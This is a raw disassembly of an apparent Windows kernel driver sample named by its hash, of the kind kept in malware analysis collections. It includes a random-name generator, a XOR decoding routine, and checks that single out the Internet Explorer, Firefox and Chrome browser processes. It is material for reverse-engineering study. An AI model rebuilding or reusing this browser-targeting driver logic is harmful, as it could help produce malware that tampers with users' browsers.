
9b375e999f93632a2a7d897be99e31f246718b13101354803f98d93d3f1b7695.exe:     file format pei-i386


Disassembly of section .text:

00010600 <.text>:
   10600:	add    BYTE PTR [eax],al
   10602:	add    BYTE PTR [eax],al
   10604:	add    BYTE PTR [eax],al
   10606:	mov    edi,edi
   10608:	push   ebp
   10609:	mov    ebp,esp
   1060b:	mov    eax,DWORD PTR [ebp+0xc]
   1060e:	xor    eax,DWORD PTR [ebp+0x10]
   10611:	mov    ecx,DWORD PTR [ebp+0x10]
   10614:	and    eax,0x7ffffffe
   10619:	xor    eax,DWORD PTR [ebp+0xc]
   1061c:	and    cl,0x1
   1061f:	movzx  ecx,cl
   10622:	shr    eax,1
   10624:	neg    ecx
   10626:	sbb    ecx,ecx
   10628:	and    ecx,0x9908b0df
   1062e:	xor    eax,ecx
   10630:	xor    eax,DWORD PTR [ebp+0x8]
   10633:	pop    ebp
   10634:	ret    0xc
   10637:	int3   
   10638:	int3   
   10639:	int3   
   1063a:	int3   
   1063b:	int3   
   1063c:	mov    edi,edi
   1063e:	push   ebp
   1063f:	mov    ebp,esp
   10641:	sub    esp,0x14
   10644:	mov    DWORD PTR [ebp-0x14],ecx
   10647:	mov    eax,DWORD PTR [ebp-0x14]
   1064a:	mov    DWORD PTR [ebp-0x8],eax
   1064d:	mov    eax,DWORD PTR [ebp-0x14]
   10650:	mov    DWORD PTR [ebp-0x10],eax
   10653:	mov    DWORD PTR [ebp-0x4],0x1
   1065a:	mov    DWORD PTR [ebp-0xc],0x509
   10661:	mov    eax,DWORD PTR [ebp-0x8]
   10664:	mov    ecx,DWORD PTR [ebp+0x8]
   10667:	mov    DWORD PTR [eax],ecx
   10669:	mov    eax,DWORD PTR [ebp-0x8]
   1066c:	add    eax,0x4
   1066f:	mov    DWORD PTR [ebp-0x8],eax
   10672:	jmp    0x1067b
   10674:	mov    eax,DWORD PTR [ebp-0x4]
   10677:	inc    eax
   10678:	mov    DWORD PTR [ebp-0x4],eax
   1067b:	cmp    DWORD PTR [ebp-0x4],0x270
   10682:	jge    0x106b7
   10684:	mov    eax,DWORD PTR [ebp-0x10]
   10687:	mov    eax,DWORD PTR [eax]
   10689:	shr    eax,0x1e
   1068c:	mov    ecx,DWORD PTR [ebp-0x10]
   1068f:	xor    eax,DWORD PTR [ecx]
   10691:	imul   eax,eax,0x15747d
   10697:	imul   eax,DWORD PTR [ebp-0xc]
   1069b:	add    eax,DWORD PTR [ebp-0x4]
   1069e:	mov    ecx,DWORD PTR [ebp-0x8]
   106a1:	mov    DWORD PTR [ecx],eax
   106a3:	mov    eax,DWORD PTR [ebp-0x8]
   106a6:	add    eax,0x4
   106a9:	mov    DWORD PTR [ebp-0x8],eax
   106ac:	mov    eax,DWORD PTR [ebp-0x10]
   106af:	add    eax,0x4
   106b2:	mov    DWORD PTR [ebp-0x10],eax
   106b5:	jmp    0x10674
   106b7:	leave  
   106b8:	ret    0x4
   106bb:	int3   
   106bc:	int3   
   106bd:	int3   
   106be:	int3   
   106bf:	int3   
   106c0:	mov    edi,edi
   106c2:	push   ebp
   106c3:	mov    ebp,esp
   106c5:	push   ecx
   106c6:	push   ebx
   106c7:	push   esi
   106c8:	push   edi
   106c9:	mov    edi,ecx
   106cb:	mov    esi,edi
   106cd:	mov    ebx,0xe3
   106d2:	push   DWORD PTR [esi+0x4]
   106d5:	mov    ecx,edi
   106d7:	push   DWORD PTR [esi]
   106d9:	dec    ebx
   106da:	push   DWORD PTR [esi+0x634]
   106e0:	call   0x10606
   106e5:	mov    DWORD PTR [esi],eax
   106e7:	add    esi,0x4
   106ea:	test   ebx,ebx
   106ec:	jne    0x106d2
   106ee:	mov    DWORD PTR [ebp-0x4],0x18c
   106f5:	lea    ebx,[esi+0x4]
   106f8:	push   DWORD PTR [ebx]
   106fa:	mov    ecx,edi
   106fc:	push   DWORD PTR [esi]
   106fe:	push   DWORD PTR [esi-0x38c]
   10704:	call   0x10606
   10709:	dec    DWORD PTR [ebp-0x4]
   1070c:	mov    DWORD PTR [esi],eax
   1070e:	mov    esi,ebx
   10710:	jne    0x106f5
   10712:	push   DWORD PTR [edi]
   10714:	mov    ecx,edi
   10716:	push   DWORD PTR [esi]
   10718:	push   DWORD PTR [esi-0x38c]
   1071e:	call   0x10606
   10723:	mov    DWORD PTR [esi],eax
   10725:	mov    DWORD PTR [edi+0x9c4],0x270
   1072f:	mov    DWORD PTR [edi+0x9c0],edi
   10735:	pop    edi
   10736:	pop    esi
   10737:	pop    ebx
   10738:	leave  
   10739:	ret    
   1073a:	int3   
   1073b:	int3   
   1073c:	int3   
   1073d:	int3   
   1073e:	int3   
   1073f:	int3   
   10740:	mov    edi,edi
   10742:	push   ebp
   10743:	mov    ebp,esp
   10745:	push   esi
   10746:	push   DWORD PTR [ebp+0x8]
   10749:	mov    esi,ecx
   1074b:	call   0x1063c
   10750:	mov    ecx,esi
   10752:	call   0x106c0
   10757:	pop    esi
   10758:	pop    ebp
   10759:	ret    0x4
   1075c:	int3   
   1075d:	int3   
   1075e:	int3   
   1075f:	int3   
   10760:	int3   
   10761:	int3   
   10762:	mov    edi,edi
   10764:	push   esi
   10765:	push   edi
   10766:	mov    edi,ecx
   10768:	lea    esi,[edi+0x9c4]
   1076e:	cmp    DWORD PTR [esi],0x0
   10771:	jne    0x10778
   10773:	call   0x106c0
   10778:	dec    DWORD PTR [esi]
   1077a:	lea    eax,[edi+0x9c0]
   10780:	mov    edx,DWORD PTR [eax]
   10782:	mov    ecx,DWORD PTR [edx]
   10784:	add    edx,0x4
   10787:	mov    DWORD PTR [eax],edx
   10789:	mov    eax,ecx
   1078b:	shr    eax,0xb
   1078e:	xor    ecx,eax
   10790:	mov    eax,ecx
   10792:	and    eax,0xff3a58ad
   10797:	shl    eax,0x7
   1079a:	xor    ecx,eax
   1079c:	mov    eax,ecx
   1079e:	and    eax,0xffffdf8c
   107a3:	shl    eax,0xf
   107a6:	xor    ecx,eax
   107a8:	mov    eax,ecx
   107aa:	shr    eax,0x12
   107ad:	pop    edi
   107ae:	xor    eax,ecx
   107b0:	pop    esi
   107b1:	ret    
   107b2:	int3   
   107b3:	int3   
   107b4:	int3   
   107b5:	int3   
   107b6:	int3   
   107b7:	int3   
   107b8:	mov    edi,edi
   107ba:	push   ebp
   107bb:	mov    ebp,esp
   107bd:	push   esi
   107be:	mov    esi,DWORD PTR [ebp+0x8]
   107c1:	shr    esi,1
   107c3:	or     esi,DWORD PTR [ebp+0x8]
   107c6:	push   edi
   107c7:	mov    eax,esi
   107c9:	shr    eax,0x2
   107cc:	or     esi,eax
   107ce:	mov    eax,esi
   107d0:	shr    eax,0x4
   107d3:	or     esi,eax
   107d5:	mov    eax,esi
   107d7:	shr    eax,0x8
   107da:	or     esi,eax
   107dc:	mov    eax,esi
   107de:	shr    eax,0x10
   107e1:	mov    edi,ecx
   107e3:	or     esi,eax
   107e5:	mov    ecx,edi
   107e7:	call   0x10762
   107ec:	and    eax,esi
   107ee:	cmp    eax,DWORD PTR [ebp+0x8]
   107f1:	ja     0x107e5
   107f3:	pop    edi
   107f4:	pop    esi
   107f5:	pop    ebp
   107f6:	ret    0x4
   107f9:	int3   
   107fa:	int3   
   107fb:	int3   
   107fc:	int3   
   107fd:	int3   
   107fe:	mov    edi,edi
   10800:	push   ebp
   10801:	mov    ebp,esp
   10803:	sub    esp,0xa04
   10809:	push   ebx
   1080a:	push   esi
   1080b:	mov    esi,DWORD PTR [ebp+0x14]
   1080e:	push   edi
   1080f:	test   esi,esi
   10811:	jne    0x108ec
   10817:	xor    ecx,ecx
   10819:	lea    eax,[ebp-0x3c]
   1081c:	mov    edx,0xff
   10821:	shl    edx,cl
   10823:	and    edx,DWORD PTR [ebp+0x8]
   10826:	shr    edx,cl
   10828:	inc    ecx
   10829:	inc    ecx
   1082a:	mov    DWORD PTR [eax],edx
   1082c:	add    eax,0x4
   1082f:	cmp    ecx,0x14
   10832:	jne    0x1081c
   10834:	mov    ebx,DWORD PTR [ebp+0xc]
   10837:	xor    eax,eax
   10839:	mov    WORD PTR [ebx],ax
   1083c:	mov    eax,DWORD PTR [ebp-0x3c]
   1083f:	push   0x5
   10841:	cdq    
   10842:	pop    ecx
   10843:	idiv   ecx
   10845:	mov    DWORD PTR [ebp-0x14],0x1de96
   1084c:	mov    DWORD PTR [ebp-0x10],0x1de8c
   10853:	mov    DWORD PTR [ebp-0xc],0x1de84
   1085a:	mov    DWORD PTR [ebp-0x8],0x1de7a
   10861:	mov    DWORD PTR [ebp-0x4],0x1de70
   10868:	mov    edx,DWORD PTR [ebp+edx*4-0x14]
   1086c:	mov    ecx,edx
   1086e:	mov    ax,WORD PTR [edx]
   10871:	inc    edx
   10872:	inc    edx
   10873:	test   ax,ax
   10876:	jne    0x1086e
   10878:	sub    edx,ecx
   1087a:	mov    edi,ebx
   1087c:	dec    edi
   1087d:	mov    esi,ecx
   1087f:	dec    edi
   10880:	mov    ax,WORD PTR [edi+0x2]
   10884:	inc    edi
   10885:	inc    edi
   10886:	test   ax,ax
   10889:	jne    0x10880
   1088b:	mov    ecx,edx
   1088d:	shr    ecx,0x2
   10890:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10892:	mov    ecx,edx
   10894:	and    ecx,0x3
   10897:	mov    eax,ebx
   10899:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1089b:	lea    ecx,[eax+0x2]
   1089e:	mov    dx,WORD PTR [eax]
   108a1:	inc    eax
   108a2:	inc    eax
   108a3:	test   dx,dx
   108a6:	jne    0x1089e
   108a8:	sub    eax,ecx
   108aa:	sar    eax,1
   108ac:	mov    ecx,eax
   108ae:	mov    eax,DWORD PTR [ebp-0x38]
   108b1:	push   0x3
   108b3:	cdq    
   108b4:	pop    esi
   108b5:	idiv   esi
   108b7:	cmp    edx,0xfffffffe
   108ba:	jle    0x109a0
   108c0:	add    edx,0x2
   108c3:	lea    esi,[ebp-0x34]
   108c6:	mov    DWORD PTR [ebp+0x8],edx
   108c9:	mov    eax,DWORD PTR [esi]
   108cb:	cdq    
   108cc:	push   0x1a
   108ce:	pop    edi
   108cf:	idiv   edi
   108d1:	add    esi,0x4
   108d4:	xor    eax,eax
   108d6:	add    edx,0x61
   108d9:	mov    WORD PTR [ebx+ecx*2],dx
   108dd:	inc    ecx
   108de:	dec    DWORD PTR [ebp+0x8]
   108e1:	mov    WORD PTR [ebx+ecx*2],ax
   108e5:	jne    0x108c9
   108e7:	jmp    0x109a0
   108ec:	cmp    esi,0x1
   108ef:	je     0x108fc
   108f1:	mov    eax,esi
   108f3:	imul   eax,eax,0xa
   108f6:	add    eax,DWORD PTR [ebp+0x10]
   108f9:	add    DWORD PTR [ebp+0x8],eax
   108fc:	push   DWORD PTR [ebp+0x8]
   108ff:	lea    ecx,[ebp-0xa04]
   10905:	call   0x10740
   1090a:	lea    eax,[esi-0x1]
   1090d:	cmp    eax,0x6
   10910:	ja     0x10921
   10912:	imul   esi,esi,0x3
   10915:	add    esi,DWORD PTR [ebp+0x10]
   10918:	mov    esi,DWORD PTR [esi*4+0x7e4bc]
   1091f:	jmp    0x10926
   10921:	mov    esi,0x1de6e
   10926:	mov    ebx,DWORD PTR [ebp+0xc]
   10929:	xor    eax,eax
   1092b:	mov    WORD PTR [ebx],ax
   1092e:	mov    eax,esi
   10930:	mov    edx,esi
   10932:	mov    cx,WORD PTR [eax]
   10935:	inc    eax
   10936:	inc    eax
   10937:	test   cx,cx
   1093a:	jne    0x10932
   1093c:	sub    eax,edx
   1093e:	mov    edi,ebx
   10940:	dec    edi
   10941:	dec    edi
   10942:	mov    cx,WORD PTR [edi+0x2]
   10946:	inc    edi
   10947:	inc    edi
   10948:	test   cx,cx
   1094b:	jne    0x10942
   1094d:	mov    ecx,eax
   1094f:	shr    ecx,0x2
   10952:	mov    esi,edx
   10954:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10956:	mov    ecx,eax
   10958:	and    ecx,0x3
   1095b:	mov    eax,ebx
   1095d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1095f:	lea    ecx,[eax+0x2]
   10962:	mov    dx,WORD PTR [eax]
   10965:	inc    eax
   10966:	inc    eax
   10967:	test   dx,dx
   1096a:	jne    0x10962
   1096c:	sub    eax,ecx
   1096e:	sar    eax,1
   10970:	push   0x5
   10972:	mov    esi,eax
   10974:	pop    edi
   10975:	push   0x23
   10977:	lea    ecx,[ebp-0xa04]
   1097d:	call   0x107b8
   10982:	cmp    eax,0xa
   10985:	jae    0x1098c
   10987:	add    eax,0x30
   1098a:	jmp    0x1098f
   1098c:	add    eax,0x57
   1098f:	movzx  eax,ax
   10992:	mov    WORD PTR [ebx+esi*2],ax
   10996:	inc    esi
   10997:	xor    eax,eax
   10999:	dec    edi
   1099a:	mov    WORD PTR [ebx+esi*2],ax
   1099e:	jne    0x10975
   109a0:	pop    edi
   109a1:	pop    esi
   109a2:	pop    ebx
   109a3:	leave  
   109a4:	ret    0x10
   109a7:	int3   
   109a8:	int3   
   109a9:	int3   
   109aa:	int3   
   109ab:	int3   
   109ac:	mov    edi,edi
   109ae:	push   ebp
   109af:	mov    ebp,esp
   109b1:	mov    eax,DWORD PTR [ebp+0x8]
   109b4:	lea    edx,[eax+0x2]
   109b7:	mov    cx,WORD PTR [eax]
   109ba:	inc    eax
   109bb:	inc    eax
   109bc:	test   cx,cx
   109bf:	jne    0x109b7
   109c1:	sub    eax,edx
   109c3:	sar    eax,1
   109c5:	pop    ebp
   109c6:	ret    0x4
   109c9:	int3   
   109ca:	int3   
   109cb:	int3   
   109cc:	int3   
   109cd:	int3   
   109ce:	mov    eax,ecx
   109d0:	ret    
   109d1:	int3   
   109d2:	int3   
   109d3:	int3   
   109d4:	int3   
   109d5:	int3   
   109d6:	ret    
   109d7:	int3   
   109d8:	int3   
   109d9:	int3   
   109da:	int3   
   109db:	int3   
   109dc:	mov    edi,edi
   109de:	push   ebp
   109df:	mov    ebp,esp
   109e1:	push   esi
   109e2:	mov    esi,DWORD PTR [ebp+0x8]
   109e5:	push   edi
   109e6:	mov    edi,DWORD PTR [ebp+0xc]
   109e9:	jmp    0x10a39
   109eb:	push   0x0
   109ed:	push   0x100
   109f2:	push   edi
   109f3:	push   esi
   109f4:	call   0x1daae
   109f9:	lea    eax,[eax*8+0x7f0b8]
   10a00:	add    DWORD PTR [eax],esi
   10a02:	adc    DWORD PTR [eax+0x4],edi
   10a05:	test   edi,edi
   10a07:	jl     0x10a42
   10a09:	jg     0x10a0f
   10a0b:	test   esi,esi
   10a0d:	jbe    0x10a42
   10a0f:	mov    eax,esi
   10a11:	xor    ecx,ecx
   10a13:	and    eax,0x1
   10a16:	or     eax,ecx
   10a18:	push   ecx
   10a19:	jne    0x10a26
   10a1b:	push   0x2
   10a1d:	push   edi
   10a1e:	push   esi
   10a1f:	call   0x1daa2
   10a24:	jmp    0x10a35
   10a26:	push   0x3
   10a28:	push   edi
   10a29:	push   esi
   10a2a:	call   0x1da96
   10a2f:	add    eax,0x1
   10a32:	adc    edx,0x0
   10a35:	mov    edi,edx
   10a37:	mov    esi,eax
   10a39:	cmp    esi,0x4
   10a3c:	jne    0x109eb
   10a3e:	test   edi,edi
   10a40:	jne    0x109eb
   10a42:	mov    edx,edi
   10a44:	pop    edi
   10a45:	mov    eax,esi
   10a47:	pop    esi
   10a48:	pop    ebp
   10a49:	ret    0x8
   10a4c:	int3   
   10a4d:	int3   
   10a4e:	int3   
   10a4f:	int3   
   10a50:	int3   
   10a51:	int3   
   10a52:	mov    edi,edi
   10a54:	push   ebp
   10a55:	mov    ebp,esp
   10a57:	push   esi
   10a58:	push   0x20
   10a5a:	push   0x61737973
   10a5f:	push   DWORD PTR [ebp+0x8]
   10a62:	push   0x1
   10a64:	call   DWORD PTR ds:0x1f018
   10a6a:	mov    esi,eax
   10a6c:	test   esi,esi
   10a6e:	jne    0x10a7b
   10a70:	push   0xc000009a
   10a75:	call   DWORD PTR ds:0x1f014
   10a7b:	mov    eax,esi
   10a7d:	pop    esi
   10a7e:	pop    ebp
   10a7f:	ret    
   10a80:	int3   
   10a81:	int3   
   10a82:	int3   
   10a83:	int3   
   10a84:	int3   
   10a85:	int3   
   10a86:	mov    edi,edi
   10a88:	push   ebp
   10a89:	mov    ebp,esp
   10a8b:	cmp    DWORD PTR [ebp+0x8],0x0
   10a8f:	je     0x10a9c
   10a91:	push   0x0
   10a93:	push   DWORD PTR [ebp+0x8]
   10a96:	call   DWORD PTR ds:0x1f01c
   10a9c:	pop    ebp
   10a9d:	ret    
   10a9e:	int3   
   10a9f:	int3   
   10aa0:	int3   
   10aa1:	int3   
   10aa2:	int3   
   10aa3:	int3   
   10aa4:	mov    edi,edi
   10aa6:	push   esi
   10aa7:	mov    esi,ecx
   10aa9:	dec    DWORD PTR [esi+0x4]
   10aac:	jne    0x10abd
   10aae:	push   DWORD PTR [esi]
   10ab0:	call   0x10a86
   10ab5:	push   esi
   10ab6:	call   0x10a86
   10abb:	pop    ecx
   10abc:	pop    ecx
   10abd:	pop    esi
   10abe:	ret    
   10abf:	int3   
   10ac0:	int3   
   10ac1:	int3   
   10ac2:	int3   
   10ac3:	int3   
   10ac4:	mov    edi,edi
   10ac6:	push   ebp
   10ac7:	mov    ebp,esp
   10ac9:	push   esi
   10aca:	xor    esi,esi
   10acc:	xor    edx,edx
   10ace:	cmp    DWORD PTR [ebp+0xc],esi
   10ad1:	je     0x10aee
   10ad3:	mov    eax,DWORD PTR [ebp+0x8]
   10ad6:	mov    ecx,DWORD PTR [ebp+0x10]
   10ad9:	mov    cl,BYTE PTR [edx+ecx*1]
   10adc:	add    eax,esi
   10ade:	xor    BYTE PTR [eax],cl
   10ae0:	lea    eax,[edx+0x1]
   10ae3:	xor    edx,edx
   10ae5:	div    DWORD PTR [ebp+0x14]
   10ae8:	inc    esi
   10ae9:	cmp    esi,DWORD PTR [ebp+0xc]
   10aec:	jne    0x10ad3
   10aee:	pop    esi
   10aef:	pop    ebp
   10af0:	ret    0x10
   10af3:	int3   
   10af4:	int3   
   10af5:	int3   
   10af6:	int3   
   10af7:	int3   
   10af8:	mov    edi,edi
   10afa:	push   ebp
   10afb:	mov    ebp,esp
   10afd:	mov    ecx,DWORD PTR [ebp+0x8]
   10b00:	mov    eax,ecx
   10b02:	lea    edx,[eax+0x2]
   10b05:	push   esi
   10b06:	mov    si,WORD PTR [eax]
   10b09:	inc    eax
   10b0a:	inc    eax
   10b0b:	test   si,si
   10b0e:	jne    0x10b06
   10b10:	sub    eax,edx
   10b12:	sar    eax,1
   10b14:	cmp    eax,0xc
   10b17:	jae    0x10b20
   10b19:	xor    al,al
   10b1b:	jmp    0x10bee
   10b20:	lea    eax,[ecx+eax*2-0x18]
   10b24:	movzx  ecx,WORD PTR [eax]
   10b27:	cmp    cx,0x69
   10b2b:	je     0x10b33
   10b2d:	cmp    cx,0x49
   10b31:	jne    0x10b19
   10b33:	movzx  ecx,WORD PTR [eax+0x2]
   10b37:	push   0x45
   10b39:	pop    esi
   10b3a:	push   0x65
   10b3c:	pop    edx
   10b3d:	cmp    cx,dx
   10b40:	je     0x10b47
   10b42:	cmp    cx,si
   10b45:	jne    0x10b19
   10b47:	movzx  ecx,WORD PTR [eax+0x4]
   10b4b:	cmp    cx,0x78
   10b4f:	je     0x10b57
   10b51:	cmp    cx,0x58
   10b55:	jne    0x10b19
   10b57:	movzx  ecx,WORD PTR [eax+0x6]
   10b5b:	cmp    cx,0x70
   10b5f:	je     0x10b67
   10b61:	cmp    cx,0x50
   10b65:	jne    0x10b19
   10b67:	movzx  ecx,WORD PTR [eax+0x8]
   10b6b:	cmp    cx,0x6c
   10b6f:	je     0x10b77
   10b71:	cmp    cx,0x4c
   10b75:	jne    0x10b19
   10b77:	movzx  ecx,WORD PTR [eax+0xa]
   10b7b:	cmp    cx,0x6f
   10b7f:	je     0x10b87
   10b81:	cmp    cx,0x4f
   10b85:	jne    0x10b19
   10b87:	movzx  ecx,WORD PTR [eax+0xc]
   10b8b:	cmp    cx,0x52
   10b8f:	je     0x10b97
   10b91:	cmp    cx,0x72
   10b95:	jne    0x10b19
   10b97:	movzx  ecx,WORD PTR [eax+0xe]
   10b9b:	cmp    cx,dx
   10b9e:	je     0x10ba9
   10ba0:	cmp    cx,si
   10ba3:	jne    0x10b19
   10ba9:	cmp    WORD PTR [eax+0x10],0x2e
   10bae:	jne    0x10b19
   10bb4:	movzx  ecx,WORD PTR [eax+0x12]
   10bb8:	cmp    cx,dx
   10bbb:	je     0x10bc6
   10bbd:	cmp    cx,si
   10bc0:	jne    0x10b19
   10bc6:	movzx  ecx,WORD PTR [eax+0x14]
   10bca:	cmp    cx,0x78
   10bce:	je     0x10bda
   10bd0:	cmp    cx,0x58
   10bd4:	jne    0x10b19
   10bda:	movzx  eax,WORD PTR [eax+0x16]
   10bde:	cmp    ax,dx
   10be1:	je     0x10bec
   10be3:	cmp    ax,si
   10be6:	jne    0x10b19
   10bec:	mov    al,0x1
   10bee:	pop    esi
   10bef:	pop    ebp
   10bf0:	ret    0x4
   10bf3:	int3   
   10bf4:	int3   
   10bf5:	int3   
   10bf6:	int3   
   10bf7:	int3   
   10bf8:	mov    edi,edi
   10bfa:	push   ebp
   10bfb:	mov    ebp,esp
   10bfd:	mov    ecx,DWORD PTR [ebp+0x8]
   10c00:	mov    eax,ecx
   10c02:	lea    edx,[eax+0x2]
   10c05:	push   esi
   10c06:	mov    si,WORD PTR [eax]
   10c09:	inc    eax
   10c0a:	inc    eax
   10c0b:	test   si,si
   10c0e:	jne    0x10c06
   10c10:	sub    eax,edx
   10c12:	sar    eax,1
   10c14:	pop    esi
   10c15:	cmp    eax,0xb
   10c18:	jae    0x10c21
   10c1a:	xor    al,al
   10c1c:	jmp    0x10cdd
   10c21:	lea    eax,[ecx+eax*2-0x16]
   10c25:	movzx  ecx,WORD PTR [eax]
   10c28:	cmp    cx,0x66
   10c2c:	je     0x10c34
   10c2e:	cmp    cx,0x46
   10c32:	jne    0x10c1a
   10c34:	movzx  ecx,WORD PTR [eax+0x2]
   10c38:	cmp    cx,0x69
   10c3c:	je     0x10c44
   10c3e:	cmp    cx,0x49
   10c42:	jne    0x10c1a
   10c44:	movzx  ecx,WORD PTR [eax+0x4]
   10c48:	cmp    cx,0x72
   10c4c:	je     0x10c54
   10c4e:	cmp    cx,0x52
   10c52:	jne    0x10c1a
   10c54:	movzx  ecx,WORD PTR [eax+0x6]
   10c58:	cmp    cx,0x65
   10c5c:	je     0x10c64
   10c5e:	cmp    cx,0x45
   10c62:	jne    0x10c1a
   10c64:	movzx  ecx,WORD PTR [eax+0x8]
   10c68:	cmp    cx,0x66
   10c6c:	je     0x10c74
   10c6e:	cmp    cx,0x46
   10c72:	jne    0x10c1a
   10c74:	movzx  ecx,WORD PTR [eax+0xa]
   10c78:	cmp    cx,0x6f
   10c7c:	je     0x10c84
   10c7e:	cmp    cx,0x4f
   10c82:	jne    0x10c1a
   10c84:	movzx  ecx,WORD PTR [eax+0xc]
   10c88:	cmp    cx,0x58
   10c8c:	je     0x10c94
   10c8e:	cmp    cx,0x78
   10c92:	jne    0x10c1a
   10c94:	cmp    WORD PTR [eax+0xe],0x2e
   10c99:	jne    0x10c1a
   10c9f:	movzx  ecx,WORD PTR [eax+0x10]
   10ca3:	cmp    cx,0x65
   10ca7:	je     0x10cb3
   10ca9:	cmp    cx,0x45
   10cad:	jne    0x10c1a
   10cb3:	movzx  ecx,WORD PTR [eax+0x12]
   10cb7:	cmp    cx,0x78
   10cbb:	je     0x10cc7
   10cbd:	cmp    cx,0x58
   10cc1:	jne    0x10c1a
   10cc7:	movzx  eax,WORD PTR [eax+0x14]
   10ccb:	cmp    ax,0x65
   10ccf:	je     0x10cdb
   10cd1:	cmp    ax,0x45
   10cd5:	jne    0x10c1a
   10cdb:	mov    al,0x1
   10cdd:	pop    ebp
   10cde:	ret    0x4
   10ce1:	int3   
   10ce2:	int3   
   10ce3:	int3   
   10ce4:	int3   
   10ce5:	int3   
   10ce6:	mov    edi,edi
   10ce8:	push   ebp
   10ce9:	mov    ebp,esp
   10ceb:	mov    ecx,DWORD PTR [ebp+0x8]
   10cee:	mov    eax,ecx
   10cf0:	lea    edx,[eax+0x2]
   10cf3:	push   esi
   10cf4:	mov    si,WORD PTR [eax]
   10cf7:	inc    eax
   10cf8:	inc    eax
   10cf9:	test   si,si
   10cfc:	jne    0x10cf4
   10cfe:	sub    eax,edx
   10d00:	sar    eax,1
   10d02:	pop    esi
   10d03:	cmp    eax,0xa
   10d06:	jae    0x10d0f
   10d08:	xor    al,al
   10d0a:	jmp    0x10db7
   10d0f:	lea    eax,[ecx+eax*2-0x14]
   10d13:	movzx  ecx,WORD PTR [eax]
   10d16:	cmp    cx,0x63
   10d1a:	je     0x10d22
   10d1c:	cmp    cx,0x43
   10d20:	jne    0x10d08
   10d22:	movzx  ecx,WORD PTR [eax+0x2]
   10d26:	cmp    cx,0x68
   10d2a:	je     0x10d32
   10d2c:	cmp    cx,0x48
   10d30:	jne    0x10d08
   10d32:	movzx  ecx,WORD PTR [eax+0x4]
   10d36:	cmp    cx,0x72
   10d3a:	je     0x10d42
   10d3c:	cmp    cx,0x52
   10d40:	jne    0x10d08
   10d42:	movzx  ecx,WORD PTR [eax+0x6]
   10d46:	cmp    cx,0x6f
   10d4a:	je     0x10d52
   10d4c:	cmp    cx,0x4f
   10d50:	jne    0x10d08
   10d52:	movzx  ecx,WORD PTR [eax+0x8]
   10d56:	cmp    cx,0x6d
   10d5a:	je     0x10d62
   10d5c:	cmp    cx,0x4d
   10d60:	jne    0x10d08
   10d62:	movzx  ecx,WORD PTR [eax+0xa]
   10d66:	cmp    cx,0x65
   10d6a:	je     0x10d72
   10d6c:	cmp    cx,0x45
   10d70:	jne    0x10d08
   10d72:	cmp    WORD PTR [eax+0xc],0x2e
   10d77:	jne    0x10d08
   10d79:	movzx  ecx,WORD PTR [eax+0xe]
   10d7d:	cmp    cx,0x65
   10d81:	je     0x10d8d
   10d83:	cmp    cx,0x45
   10d87:	jne    0x10d08
   10d8d:	movzx  ecx,WORD PTR [eax+0x10]
   10d91:	cmp    cx,0x78
   10d95:	je     0x10da1
   10d97:	cmp    cx,0x58
   10d9b:	jne    0x10d08
   10da1:	movzx  eax,WORD PTR [eax+0x12]
   10da5:	cmp    ax,0x65
   10da9:	je     0x10db5
   10dab:	cmp    ax,0x45
   10daf:	jne    0x10d08
   10db5:	mov    al,0x1
   10db7:	pop    ebp
   10db8:	ret    0x4
   10dbb:	int3   
   10dbc:	int3   
   10dbd:	int3   
   10dbe:	int3   
   10dbf:	int3   
   10dc0:	mov    edi,edi
   10dc2:	push   ebp
   10dc3:	mov    ebp,esp
   10dc5:	push   DWORD PTR [ebp+0x8]
   10dc8:	call   0x10af8
   10dcd:	test   al,al
   10dcf:	je     0x10dd6
   10dd1:	xor    eax,eax
   10dd3:	inc    eax
   10dd4:	jmp    0x10df9
   10dd6:	push   DWORD PTR [ebp+0x8]
   10dd9:	call   0x10bf8
   10dde:	test   al,al
   10de0:	je     0x10de7
   10de2:	push   0x2
   10de4:	pop    eax
   10de5:	jmp    0x10df9
   10de7:	push   DWORD PTR [ebp+0x8]
   10dea:	call   0x10ce6
   10def:	movzx  eax,al
   10df2:	neg    eax
   10df4:	sbb    eax,eax
   10df6:	and    eax,0x3
   10df9:	pop    ebp
   10dfa:	ret    0x4
   10dfd:	int3   
   10dfe:	int3   
   10dff:	int3   
   10e00:	int3   
   10e01:	int3   
   10e02:	mov    edi,edi
   10e04:	push   ebp
   10e05:	mov    ebp,esp
   10e07:	sub    esp,0x10
   10e0a:	push   esi
   10e0b:	push   edi
   10e0c:	xor    eax,eax
   10e0e:	mov    WORD PTR [ebp-0x8],ax
   10e12:	lea    edi,[ebp-0x6]
   10e15:	stos   DWORD PTR es:[edi],eax
   10e16:	stos   WORD PTR es:[edi],ax
   10e18:	mov    eax,DWORD PTR [ebp+0xc]
   10e1b:	mov    DWORD PTR [ebp-0x4],eax
   10e1e:	lea    ecx,[eax+0x2]
   10e21:	mov    dx,WORD PTR [eax]
   10e24:	inc    eax
   10e25:	inc    eax
   10e26:	test   dx,dx
   10e29:	jne    0x10e21
   10e2b:	mov    esi,DWORD PTR [ebp+0x8]
   10e2e:	movzx  edx,WORD PTR [esi]
   10e31:	sub    eax,ecx
   10e33:	sar    eax,1
   10e35:	lea    ecx,[eax+eax*1]
   10e38:	mov    WORD PTR [ebp-0x8],cx
   10e3c:	mov    WORD PTR [ebp-0x6],cx
   10e40:	cmp    dx,cx
   10e43:	jb     0x10e82
   10e45:	xor    eax,eax
   10e47:	lea    edi,[ebp-0xe]
   10e4a:	stos   DWORD PTR es:[edi],eax
   10e4b:	stos   WORD PTR es:[edi],ax
   10e4d:	mov    WORD PTR [ebp-0x10],cx
   10e51:	mov    WORD PTR [ebp-0xe],cx
   10e55:	movzx  eax,dx
   10e58:	movzx  ecx,cx
   10e5b:	sub    eax,ecx
   10e5d:	mov    ecx,DWORD PTR [esi+0x4]
   10e60:	cdq    
   10e61:	sub    eax,edx
   10e63:	sar    eax,1
   10e65:	lea    eax,[ecx+eax*2]
   10e68:	mov    DWORD PTR [ebp-0xc],eax
   10e6b:	push   0x1
   10e6d:	lea    eax,[ebp-0x8]
   10e70:	push   eax
   10e71:	lea    eax,[ebp-0x10]
   10e74:	push   eax
   10e75:	call   DWORD PTR ds:0x1f020
   10e7b:	neg    eax
   10e7d:	sbb    eax,eax
   10e7f:	inc    eax
   10e80:	jmp    0x10e84
   10e82:	xor    al,al
   10e84:	pop    edi
   10e85:	pop    esi
   10e86:	leave  
   10e87:	ret    0x8
   10e8a:	int3   
